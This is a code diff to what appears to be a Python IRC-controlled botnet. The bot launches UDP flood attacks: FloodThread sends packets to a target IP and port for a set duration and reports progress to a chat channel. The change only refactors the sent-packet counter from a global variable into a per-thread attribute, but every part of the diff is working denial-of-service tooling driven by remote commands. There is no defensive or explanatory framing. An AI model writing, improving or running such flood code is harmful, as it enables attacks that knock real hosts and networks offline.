@@ -283,6 +283,7 @@ class FloodThread(Thread):
         self.port     = port
         self.duration = duration
         self.channel  = channel
+        self.sent     = 0
 
     def run(self):
         flood_threads.append(self)
@@ -293,15 +294,12 @@ class FloodThread(Thread):
 
         timeout = time.time() + self.duration
 
-        global sent
-        sent = 0
-
         bot.send("Attacking " + str(self.ip) + " on port " + str(self.port) + ".", self.channel)
 
         while 1:
             if time.time() > timeout:
                 if self in flood_threads:
-                    self.end(sent)
+                    self.end()
                 else:
                     break
             else:
@@ -312,10 +310,10 @@ class FloodThread(Thread):
 
             else:
                 udp_socket.sendto(bytes, (self.ip, self.port))
-                sent += 1
+                self.sent += 1
 
-    def end(self, sent):
-        bot.send("Attack on " + self.ip + " has finished. Sent " + str(sent) + " packages.", self.channel)
+    def end(self):
+        bot.send("Attack on " + self.ip + " has finished. Sent " + str(self.sent) + " packages.", self.channel)
         flood_threads.remove(self)
 
 scan_threads = []
@@ -489,7 +487,7 @@ while True:
                                     bot.send("There are no attacks running!", data.channel)
 
                                 else:
-                                    thread_to_end.end(sent)
+                                    thread_to_end.end()
                             else:
                                 pass
 
